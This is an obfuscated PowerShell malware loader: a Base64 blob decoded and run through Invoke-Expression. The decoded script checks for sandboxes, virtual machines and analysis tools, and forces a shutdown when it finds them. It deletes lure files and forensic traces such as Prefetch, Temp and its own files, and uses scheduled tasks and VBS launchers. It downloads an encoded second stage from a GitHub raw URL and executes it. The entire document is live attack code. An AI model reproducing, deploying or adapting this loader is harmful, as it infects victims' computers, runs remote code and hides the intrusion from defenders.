$SXAJD="ZnVuY3Rpb24gRXhlY3Ugew0KICAgIFBhcmFtICgkY29tLCRhcmcpICAgIA0KICAgIGlmICghKCRhcmcpKSB7DQogICAgICAgICRhcmcgPSAiICINCiAgICB9ICAgIA0KICAgICRnZGUgPSBHZXQtRGF0ZSA7DQogICAgJGdkID0gJGdkZS5BZGRNaW51dGVzKDEuMTUpDQogICAgJGhyID0gJGdkLmhvdXIgDQogICAgJG1uID0gJGdkLk1pbnV0ZQ0KICAgIGlmICgkaHIgLWx0IDEwICkgeyRociA9ICIwJGhyIn0NCiAgICBpZiAoJG1uIC1sdCAxMCApIHskbW4gPSAiMCRtbiJ9DQogICAgJHN0ID0gIiRoci0kbW4iLlJlcGxhY2UoIi0iLCI6IikgICAgDQogICAgJHlyID0gJGdkLlllYXIgICAgOyAgICAkbSA9ICRnZC5Nb250aA0KICAgIGlmICgkbSAtZ3QgOSl7ICRtb24gPSAkbSB9IGVsc2UgeyAkbW9uID0gIjAkbSIgfSA7ICRkID0gJGdkLkRheQ0KICAgICR0aW1lID0gIiR5ci0kbW9uLSRkJVQkc3QlOjAwIi5SZXBsYWNlKCIlIiwiIikNCiAgICAkZGF0ZSA9ICIyMDI0LTAxLTAxVDE2OjIwOjAwIiA7ICRzdCA9ICR0aW1lDQogICAgJGZpbGUgPSAkY29tIDsgJGFyZ3VtZW50cyA9ICRhcmcNCiAgICAkeG1scGEgPSAiQzpcV2luZG93c1xTeXN0ZW0zMlxUYXNrc1wkdG4iDQogICAgdHJ5IHsgICR0aW0gPSAkZ2QuVG9TaG9ydFRpbWVTdHJpbmcoKQ0KICAgICAgICAkYWN0ID0gTmV3LVNjaGVkdWxlZFRhc2tBY3Rpb24gLUV4ZWN1dGUgJGZpbGUgIC1Bcmd1bWVudCAgJGFyZ3VtZW50cw0KICAgICAgICAkdHJpID0gTmV3LVNjaGVkdWxlZFRhc2tUcmlnZ2VyIC1PbmNlIC1BdCAkdGltDQogICAgICAgICRzZXQgPSBOZXctU2NoZWR1bGVkVGFza1NldHRpbmdzU2V0IC1BbGxvd1N0YXJ0SWZPbkJhdHRlcmllcyANCiAgICAgICAgUmVnaXN0ZXItU2NoZWR1bGVkVGFzayAtQWN0aW9uICRhY3QgLVRyaWdnZXIgJHRyaSAtU2V0dGluZ3MgJHNldCAgLVRhc2tOYW1lICR0biB8IE91dC1OdWxsDQogICAgfSBjYXRjaCB7ICR4bWxjID0gIjw/eG1sIHZlcnNpb249YCIxLjBgIiBlbmNvZGluZz1gIlVURi0xNmAiPz5gbjxUYXNrIHZlcnNpb249YCIxLjJgIiB4bWxucz1gImh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZG93cy8yMDA0LzAyL21pdC90YXNrYCI+YG4gIDxSZWdpc3RyYXRpb25JbmZvPmBuICAgIDxEYXRlPiRkYXRlPC9EYXRlPmBuICAgIDxBdXRob3I+JGVudjpjb21wdXRlcm5hbWVcJGVudjp1c2VybmFtZTwvQXV0aG9yPmBuICAgIDxVUkk+XCRUTjwvVVJJPmBuICA8L1JlZ2lzdHJhdGlvbkluZm8+YG4gIDxUcmlnZ2Vycz5gbiAgICA8VGltZVRyaWdnZXI+YG4gICAgICA8U3RhcnRCb3VuZGFyeT4kU1Q8L1N0YXJ0Qm91bmRhcnk+YG4gICAgICA8RW5hYmxlZD50cnVlPC9FbmFibGVkPmBuICAgIDwvVGltZVRyaWdnZXI+YG4gIDwvVHJpZ2dlcnM+YG4gIDxTZXR0aW5ncz5gbiAgICA8TXVsdGlwbGVJbnN0YW5jZXNQb2xpY3k+SWdub3JlTmV3PC9NdWx0aXBsZUluc3RhbmNlc1BvbGljeT5gbiAgICA8RGlzYWxsb3dTdGFydElmT25CYXR0ZXJpZXM+ZmFsc2U8L0Rpc2FsbG93U3RhcnRJZk9uQmF0dGVyaWVzPmBuICAgIDxTdG9wSWZHb2luZ09uQmF0dGVyaWVzPmZhbHNlPC9TdG9wSWZHb2luZ09uQmF0dGVyaWVzPmBuICAgIDxBbGxvd0hhcmRUZXJtaW5hdGU+ZmFsc2U8L0FsbG93SGFyZFRlcm1pbmF0ZT5gbiAgICA8U3RhcnRXaGVuQXZhaWxhYmxlPnRydWU8L1N0YXJ0V2hlbkF2YWlsYWJsZT5gbiAgICA8UnVuT25seUlmTmV0d29ya0F2YWlsYWJsZT5mYWxzZTwvUnVuT25seUlmTmV0d29ya0F2YWlsYWJsZT5gbiAgICA8SWRsZVNldHRpbmdzPmBuICAgICAgPER1cmF0aW9uPlBUMTBNPC9EdXJhdGlvbj5gbiAgICAgIDxXYWl0VGltZW91dD5QVDFIPC9XYWl0VGltZW91dD5gbiAgICAgIDxTdG9wT25JZGxlRW5kPnRydWU8L1N0b3BPbklkbGVFbmQ+YG4gICAgICA8UmVzdGFydE9uSWRsZT5mYWxzZTwvUmVzdGFydE9uSWRsZT5gbiAgICA8L0lkbGVTZXR0aW5ncz5gbiAgICA8QWxsb3dTdGFydE9uRGVtYW5kPnRydWU8L0FsbG93U3RhcnRPbkRlbWFuZD5gbiAgICA8RW5hYmxlZD50cnVlPC9FbmFibGVkPmBuICAgIDxIaWRkZW4+dHJ1ZTwvSGlkZGVuPmBuICAgIDxSdW5Pbmx5SWZJZGxlPmZhbHNlPC9SdW5Pbmx5SWZJZGxlPmBuICAgIDxXYWtlVG9SdW4+ZmFsc2U8L1dha2VUb1J1bj5gbiAgICA8RXhlY3V0aW9uVGltZUxpbWl0PlBUNzJIPC9FeGVjdXRpb25UaW1lTGltaXQ+YG4gICAgPFByaW9yaXR5Pjc8L1ByaW9yaXR5PmBuICA8L1NldHRpbmdzPmBuICA8QWN0aW9ucyBDb250ZXh0PWAiQXV0aG9yYCI+YG4gICAgPEV4ZWM+YG4gICAgPENvbW1hbmQ+JGZpbGU8L0NvbW1hbmQ+YG4gICAgPEFyZ3VtZW50cz4kYXJndW1lbnRzPC9Bcmd1bWVudHM+YG4gICAgPC9FeGVjPmBuICA8L0FjdGlvbnM+YG4gIDxQcmluY2lwYWxzPmBuICAgIDxQcmluY2lwYWwgaWQ9YCJBdXRob3JgIj5gbiAgICAgIDxVc2VySWQ+JGVudjpjb21wdXRlcm5hbWVcJGVudjp1c2VybmFtZTwvVXNlcklkPmBuICAgICAgPExvZ29uVHlwZT5JbnRlcmFjdGl2ZVRva2VuPC9Mb2dvblR5cGU+YG4gICAgICA8UnVuTGV2ZWw+TGVhc3RQcml2aWxlZ2U8L1J1bkxldmVsPmBuICAgIDwvUHJpbmNpcGFsPmBuICA8L1ByaW5jaXBhbHM+YG48L1Rhc2s+Ig0KICAgICAgICAkeG1sYyA+ICR4bWxwYQ0KICAgICAgICB0cnkgeyBDOlxXaW5kb3dzXFN5c3RlbTMyXHNjaHRhc2tzLmV4ZSAvY3JlYXRlIC9YTUwgJHhtbHBhIC90biAkdG4gL2YgICB9IGNhdGNoIHsgQzpcV2luZG93c1xTeXN0ZW0zMlxzY2h0YXNrcy5leGUgL2NyZWF0ZSAvdG4gJHRuIC90ciAiJGZpbGUgJGFyZ3VtZW50cyIgL1NDIERBSUxZIC9TVCAkc3QgL2YgfSAgICAgICAgICAgIA0KICAgIH0NCn0NCg0KZnVuY3Rpb24gcmVjcyB7IA0KICAgICRyZWMgPSAiJGVudjo/Pz8/YT8/XE1pY3Jvc29mdFxXaW5kb3dzXFJlY2VudCIgDQogICAgJGZyZSA9ICcnIA0KICAgICRybmQgPSBHZXQtUmFuZG9tDQogICAgZGlyICRyZWMgLWZpbHRlciAqLmxuayB8ICUgeyANCiAgICAgICAgJGZuID0gJF8uZnVsbG5hbWUgIA0KICAgICAgICAkbG5reiA9ICRhLmNyZWF0ZXNob3J0Y3V0KCRmbikgDQogICAgICAgICR0YXIgPSAkbG5rei50YXJnZXRwYXRoIA0KICAgICAgICBpZiAoIShbc3RyaW5nXTo6aXNudWxsb3JFbXB0eSgkdGFyKSkpeyANCiAgICAgICAgICAgIGlmICh0ZXN0LXBhdGggJHRhcikgeyANCiAgICAgICAgICAgICAgICAkcGFyID0gU3BsaXQtcGF0aCAkdGFyIC1wYXJlbnQgDQogICAgICAgICAgICAgICAgaWYgKCRmcmUgLWxpa2UgIiokcGFyKiIgLW9yICRwYXIgLWVxICdDOlwnICAtb3IgJHBhciAtbGlrZSAnQzpcV2luZG93KicgICl7ICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICB9IGVsc2UgeyANCiAgICAgICAgICAgICAgICAgICAgJGZyZSArPSAiJHBhciAiIA0KICAgICAgICAgICAgICAgICAgICAkZWVlICs9ICIgY2QgL2QgYCIkcGFyYCIgJiYgZGVsICpfNCouYmF0IC9zIC9mIC9xICYmIGRlbCAqXzQqLmh0YSAvcyAvZiAvcSAmJiBkZWwgKl80Ki5odG1sIC9zIC9mIC9xICYmIGRlbCAqXzQqLnN2ZyAvcyAvZiAvcSAmJiBkZWwgKl80Ki56aXAgL3MgL2YgL3EgICYmIGRlbCAqXzQqQ29wKiAvcyAvZiAvcSAmJiB0aW1lb3V0IDIgPiBudWwgJiYgIiANCiAgICAgICAgICAgICAgICB9IA0KICAgICAgICAgICAgfSAgICAgICAgICAgIA0KICAgICAgICB9ICAgDQogICAgfSANCiAgICAkZGUgPSAkZW52OnVzZXJwcm9maWxlICsgJ1xEZXNrdG9wJyANCiAgICAkZG8gPSAkZW52OnVzZXJwcm9maWxlKyAnXERvd25sb2FkcycgDQogICAgJGRlbyA9ICIgY2QgL2QgYCIkZG9gIiAmJiBkZWwgKl80Ki5iYXQgL3MgL2YgL3EgJiYgZGVsICpfNCouaHRhIC9zIC9mIC9xICYmIGRlbCAqXzQqLmh0bWwgL3MgL2YgL3EgJiYgZGVsICpfNCouc3ZnIC9zIC9mIC9xICYmIGRlbCAqXzQqLnppcCAvcyAvZiAvcSAgJiYgZGVsICpfNCpDb3AqIC9zIC9mIC9xICYmIHRpbWVvdXQgMSA+IG51bCAmJiAgY2QgL2QgYCIkZGVgIiAmJiBkZWwgKl80Ki5iYXQgL3MgL2YgL3EgJiYgZGVsICpfNCouaHRhIC9zIC9mIC9xICYmIGRlbCAqXzQqLmh0bWwgL3MgL2YgL3EgJiYgZGVsICpfNCouc3ZnIC9zIC9mIC9xICYmIGRlbCAqXzQqLnppcCAvcyAvZiAvcSAgJiYgZGVsICpfNCpDb3AqIC9zIC9mIC9xICYmIHRpbWVvdXQgMiA+IG51bCAiDQogICAgJGtiYXQgPSAiJGVudjpwdWJsaWNcJHJuZC5iYXQiIA0KICAgICRlZWUgPSAkZWVlLlRyaW1lbmQoJyAmJiAnKSANCg0KICAgIFtTeXN0ZW0uSU8uRmlsZV06OldyaXRlQWxsVGV4dCgka2JhdCwgIkBlY2hvIG9mZmBuJGVlZWBuJGRlb2BuZGVsICV+RjAgL3EiKSANCg0KICAgIDwjJHZicyA9ICJPbiBFcnJvciBSZXN1bWUgTmV4dCA6IFJhbmRvbWl6ZSAgOiBiID0gUm91bmQoUm5kICogMTAwKSAvIFJvdW5kKFJuZCAqIDEwMDAwKSA6IHNldCBzID0gQ3JlYXRlT2JqZWN0KGAid3NjcmlwdC5TaGVsbGAiKSA6IHMucnVuIGAiJGtiYXRgIiAsIDAiIz4NCiAgICA8I1tTeXN0ZW0uSU8uRmlsZV06OldyaXRlQWxsVGV4dCgkeHgsJHZicykgIz4NCiAgICA8I0V4ZWN1IC1jb20gIkM6XFdpbmRvd3NcU3lzdGVtMzJcd3NjcmlwdC5leGUiIC1hcmcgIiAkeHgiIz4NCg0KICAgIHRyeSB7DQogICAgICAgICR0cnVlID0gJGZhbHNlDQogICAgICAgIDwjICRoID0gW2FjdGl2YXRvcl06OkNyZWF0ZUluc3RhbmNlKFt0eXBlXTo6R2V0VHlwZUZyb21DTFNJRCgiOUJBMDU5NzItRjZBOC0xMUNGLUE0NDItMDBBMEM5MEE4RjM5IikpICM+DQogICAgICAgIDwjICR6ID0gJGguSXRlbSgpICM+DQogICAgICAgIDwjICR6LkRvY3VtZW50LkFwcGxpY2F0aW9uLlNoZWxsRXhlY3V0ZSgka2JhdCwgIiIsICIiLCAib3BlbiIsIDEpICM+DQogICAgfSBjYXRjaCB7DQogICAgICAgICR2cyA9ICJPbiBFcnJvciBSZXN1bWUgTmV4dCA6IFJhbmRvbWl6ZSAgOiBiID0gUm91bmQoUm5kICogMTAwKSAvIFJvdW5kKFJuZCAqIDEwMDAwKSA6IHNldCBzID0gQ3JlYXRlT2JqZWN0KGAid3NjcmlwdC5TaGVsbGAiKSA6IHMucnVuIGAiJGtiYXRgIiAsIDEiDQogICAgICAgICRydnMgPSBHZXQtUmFuZG9tDQogICAgICAgICR2c2YgPSAiJGVudjpwdWJsaWNcJHJ2cy52YnMiDQogICAgICAgIFtTeXN0ZW0uSW8uRmlsZV06OldyaXRlQWxsVGV4dCgkdnNmLCR2cykNCiAgICAgICAgaWYgKHRlc3QtcGF0aCAkdnNmKSB7DQogICAgICAgICAgICBFeGVjdSAtY29tICJDOlxXaW5kb3dzXFN5c3RlbTMyXHdzY3JpcHQuZXhlIiAtYXJnICR2c2YNCiAgICAgICAgfSAgICAgICAgDQogICAgICAgIHNsZWVwIDgwDQogICAgICAgIHRyeSB7IFVucmVnaXN0ZXItU2NoZWR1bGVkVGFzayAtVGFza05hbWUgJHRuICAtQ29uZmlybTokZmFsc2UgfSBjYXRjaCB7IEM6XFdpbmRvd3NcU3lzdGVtMzJcc2NodGFza3MuZXhlIC9kZWxldGUgL3RuICR0biAvZiB9DQogICAgfQ0KICAgIHNsZWVwIDUNCn0gIA0KRnVuY3Rpb24gY2xpbm4geyANCiAgICANCiAgICBzdG9wLXByb2Nlc3MgLW5hbWUgJypyYXIqJyAtZm9yY2UgLXBhc3N0aHJ1IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgc3RvcC1wcm9jZXNzIC1uYW1lICcqN3oqJyAtZm9yY2UgLXBhc3N0aHJ1IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgcmVjcyANCiAgICBkZWwgQzpcV2luZG93c1xQcmVmZXRjaFwqIC1mb3JjZSAtcmVjdXJzZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ0KICAgIGRlbCBDOlxXaW5kb3dzXFRlbXBcKiAtZm9yY2UgLXJlY3Vyc2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCiAgICBkZWwgJGVudjp0bXBcKiAtZm9yY2UgLXJlY3Vyc2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCiAgICBzbGVlcCAzDQogICAgZGlyICIkZW52OnB1YmxpYyIgfCAlIHsgJGZmID0gJF8uRnVsbE5hbWUgOyBpZiAoJGIuZmlsZUV4aXN0cygkZmYpKXsgc2RlbCgkZmYpIH0gfQ0KICAgIA0KfSANCg0KZnVuY3Rpb24gc2RlbCgkcGEpeyANCiAgICAkcmFuID0gR0V0LVJhbmRvbSANCiAgICBpZigkYi5maWxlRXhpc3RzKCRwYSkpeyANCiAgICAgICAgaWYgKCRlLmxlbmd0aCAtbGUgMCkgew0KICAgICAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgICAgICAiREVMICRwYWBuIiAgICAgICAgDQogICAgICAgICAgICAgICAgZWNobyAkcmFuID4gJHBhIA0KICAgICAgICAgICAgICAgIGRlbCAkcGEgLWZvcmNlICAgICANCiAgICAgICAgICAgIH0gY2F0Y2gge30NCiAgICAgICAgfQ0KICAgIH0gDQp9ICANCkZ1bmN0aW9uIHhpdHsgDQogICAgY2xpbm4gDQogICAgR2V0LXByb2Nlc3MgIHwgJSB7IGlmICgkXy5uYW1lIC1tYXRjaCAkeHBybyAtb3IgJF8ubWFpbndpbmRvd3RpdGxlIC1tYXRjaCAkeHBybyl7IHN0b3AtcHJvY2VzcyAtbmFtZSAkXy5uYW1lIC1mb3JjZSAtcGFzc3RocnUgfSB9ICANCiAgICAkYS5ydW4oJ3NodXRkb3duLmV4ZSAvcyAvZiAvdCAwMCcsMCkNCn0gDQpGdW5jdGlvbiB1aSAoJGYpIHsgDQogICAgW2J5dGVbXV0kbyA9ICRmLnNwbGl0KCcvJykgDQogICAgICAgICR3dyA9ICcnIA0KICAgICAgICAkbyB8ICUgeyAgJHMgPSBbY2hhcl0kXyANCiAgICAgICAgJHd3ICs9ICRzIA0KICAgICAgICBzbGVlcCAtTWlsbGlzZWNvbmRzIDAuNA0KICAgIH0gDQogICAgcmV0dXJuICR3dyANCn0gDQpmdW5jdGlvbiBpbmYgeyANCiAgICAkdXJsID0gImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9TNE1TM1AvWFhYL21haW4vMlcwMiIgDQogICAgdHJ5IHsNCiAgICAgICAgJG8gPSBbYWN0aXZhdG9yXTo6Q3JlYXRlSW5zdGFuY2UoW3R5cGVdOjpHZXRUeXBlRnJvbUNMU0lEKCJGNTA3OEYzNS1DNTUxLTExRDMtODlCOS0wMDAwRjgxRkUyMjEiKSkNCiAgICAgICAgJG8uT3BlbigiR0VUIiwgJHVybCAsICRGYWxzZSkNCiAgICAgICAgJG8uU2VuZCgpDQogICAgICAgICRieXRlcyA9ICRvLnJlc3BvbnNlVGV4dDsNCiAgICB9IGNhdGNoIHsNCiAgICAgICAgJGJ5dGVzID0gJHcuRG93bmxvYWRTdHJpbmcoJHVybCkNCiAgICB9DQogICAgaWYgKCEoW3N0cmluZ106OmlzbnVsbG9yRW1wdHkoJGJ5dGVzKSkpIHsgICAgICAgICANCiAgICAgICAgJGNvbiA9ICRieXRlcw0KICAgICAgICAkY29kZSA9IHVpKCRjb24pIA0KICAgICAgICAkY29kZSB8IGlleCANCiAgICB9DQp9ICANCiR1biA9ICgkZW52OnVzZXJuYW1lKS5Ub2xvd2VyKCkgDQokY28gPSAoJGVudjpDb21wdXRlcm5hbWUpLlRvTG93ZXIoKSANCiRiID0gTmV3LU9iamVjdCAtQ29tT2JqZWN0IFNjcmlwdGluZy5GaWxlU3lzdGVtT2JqZWN0IA0KJGEgPSBOZXctT2JqZWN0IC1Db21PYmplY3QgV3NjcmlwdC5zaGVsbCANCiR3ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudCAgDQokbSA9ICRNeUludm9jYXRpb24uTXlDb21tYW5kLlBhdGgNCiRybmQgPSBHZXQtUmFuZG9tDQokdG4gPSAkcm5kDQoNCiR4Y29tcCA9ICcoaGFsOXRofGJlZTczNzBjLThjMGMtNHxxYXJ6aHJkYnBofHNlcnZlcjF8d2RhZ3V0aWxpdHlhY2NvdW50KScgDQokeHVzZXIgPSAnKG1hbHdhcmV8YW5hbHlzdHxtYWxhbmFseXN0fGpvaG5kb2V8am9obiBkb2V8c2FuZGJveHxzYW5kIGJveHxhbmFseXNlfGFuYWx5c2lzfHdkYWd1dGlsaXR5YWNjb3VudHx2aXJ1c3Rlc3R8dGVzdHxkZWJ1Z3xhdmFzdHxrYXNwZXJza3l8YW5hbHlzfGpvaG5ofHppbW1lcm1hbnxtYWxpY3xweG1kdW9wdnl4fDh2aXpzbXx3MGZqdW92bWNjcDVhfGxtdndqajlifHBxb25qaHZ3ZXhzc3wzdTJ2OW04fGhldWVyemwpJyANCiR4cHJvID0gJyhwcm9jZXNzZXhwbG9yZXJ8YXV0b3J1bnx3aXJlc2hhY2t8eGRiZzMyfHhkYmc2NHxuZXRtb258bmV0c3RhdHxyZWdzaG90fHJlZ21vbnxwcm9jZXNzaGFja2VyfHN5c2ludGVybmFsc3N1aXRlfG1vbml0b3J8cHJvY2R1bXB8cHJvY2VzcyBleHBsb3Jlcnxwb3J0bW9ufGRpc2ttb258ZGlza2V4dHx0Y3B2aWV3fGRiZ3ZpZXd8ZGlza3ZoZHxudGZzaW5mb3xwcm9jZXhwfHN5c21vbnxodHRwZGVidWdnZXJ1aXxmaWRkbGVyfHZib3hzZXJ2aWNlfGRmNXNlcnZ8dmJveHRyYXl8dm10b29sc2R8dm13YXJldHJheXxpZGE2NHxvbGx5ZGJnfHBlc3R1ZGlvfHZtd2FyZXVzZXJ8dmdhdXRoc2VydmljZXx2bWFjdGhscHx4OTZkYmd8dm1zcnZjfHgzMmRiZ3x2bXVzcnZjfHBybF9jY3xwcmxfdG9vbHN8eGVuc2VydmljZXxxZW11LWdhfGpvZWJveGNvbnRyb2x8a3NkdW1wZXJjbGllbnR8a3NkdW1wZXJ8am9lYm94c2VydmVyKScgDQokeHggPSAiJGVudjpwdWJsaWNcJHJuZC52YnMiIA0KDQppZiAoJHVuIC1tYXRjaCAkeHVzZXIpIHsgeGl0IH0gDQppZiAoJGNvIC1tYXRjaCAkeGNvbXApIHsgeGl0IH0gDQpHZXQtcHJvY2VzcyAgfCAlIHsgaWYgKCRfLm5hbWUgLW1hdGNoICR4cHJvIC1vciAkXy5tYWlud2luZG93dGl0bGUgLW1hdGNoICR4cHJvKXsgeGl0IH0gfSANCg0KJGUgPSBnZXQtcHJvY2VzcyAtbmFtZSAiKnZhc3QqIiANCg0KDQokY25tID0gJGVudjpDb21wdXRlcm5hbWUNCiRyZ3MgPSBbTWljcm9zb2Z0LldpbjMyLlJlZ2lzdHJ5S2V5XTo6T3BlblJlbW90ZUJhc2VLZXkoJ0xvY2FsTWFjaGluZScsICRjbm0pDQokcmdzS2V5ID0gJHJncy5PcGVuU3ViS2V5KCJTWVNURU1cXEN1cnJlbnRDb250cm9sU2V0XFxTZXJ2aWNlc1xcRGlza1xcRW51bVxcIikNCiRkZXYgPSAkcmdzS2V5LkdldFZhbHVlKCIwIikNCg0KJHJnc0tleSA9ICRyZ3MuT3BlblN1YktleSgiU1lTVEVNXFxDb250cm9sU2V0MDAxXFxDb250cm9sXFxTeXN0ZW1JbmZvcm1hdGlvbiIpDQokYmlvID0gJHJnc0tleS5HZXRWYWx1ZSgiQmlvc1ZlcnNpb24iKQ0KJHByb2QgPSAkcmdzS2V5LkdldFZhbHVlKCJTeXN0ZW1Qcm9kdWN0bmFtZSIpDQoNCnRyeSB7ICRtb2QgPSAoR2V0LVdtaU9iamVjdCB3aW4zMl9jb21wdXRlcnN5c3RlbSkubW9kZWwgDQppZiAoJG1vZCAtbWF0Y2ggJyh2Ym94fHZtd2FyZXx2aXJ0dWFsKScpIHsgc3RhcnQgY2FsYy5leGUgOyA8I3hpdCM+IH0gICB9IGNhdGNoIHsgfQ0KaWYgKCRiaW8gLW1hdGNoICcodmJveHx2bXdhcmV8dmlydHVhbCknKSB7IHhpdCB9IA0KaWYgKCRwcm9kIC1tYXRjaCAnKHZib3h8dm13YXJlfHZpcnR1YWwpJykgeyB4aXQgfSANCmlmICgkZGV2IC1tYXRjaCAnKHZib3h8dm13YXJlfHZpcnR1YWwpJykgeyB4aXQgfSANCmNsaW5uIDs7IGluZg0Kc2RlbCgkeHgpDQpzZGVsKCR4eCkNCnNkZWwoJG0pDQpzbGVlcCA1";$KDT=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($SXAJD));$KDT|&([char]73+[char]69+[char]120)